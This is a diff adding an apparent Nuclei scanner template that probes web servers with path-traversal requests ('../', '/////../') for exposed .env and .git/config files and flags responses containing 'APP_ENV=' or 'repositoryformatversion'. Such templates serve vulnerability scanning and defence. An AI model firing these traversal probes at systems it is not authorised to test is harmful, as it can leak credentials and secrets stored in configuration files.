@@ -1,0 +1,33 @@
+id: information-disclosure-erickfernandox
+
+info:
+  name: Information Disclosure
+  author: erickfernandox
+  severity: high
+  tags: cve,disclosure
+
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}/../.env"
+      - "{{BaseURL}}/////../.env"
+      - "{{BaseURL}}/../.git/config"      
+      - "{{BaseURL}}/////../.git/config"      
+      - "{{BaseURL}}/../../.env"
+      - "{{BaseURL}}/////../../.env"
+      - "{{BaseURL}}/../../.git/config"      
+      - "{{BaseURL}}/////../../.git/config"      
+      - "{{BaseURL}}/../../../.env"
+      - "{{BaseURL}}/////../../../.env"
+      - "{{BaseURL}}/../../../.git/config"      
+      - "{{BaseURL}}/////../../../.git/config"     
+
+    stop-at-first-match: true               
+    matchers-condition: and
+    matchers:
+      - type: word
+        words: 
+          - "APP_ENV="
+          - "repositoryformatversion"
+
+        part: body
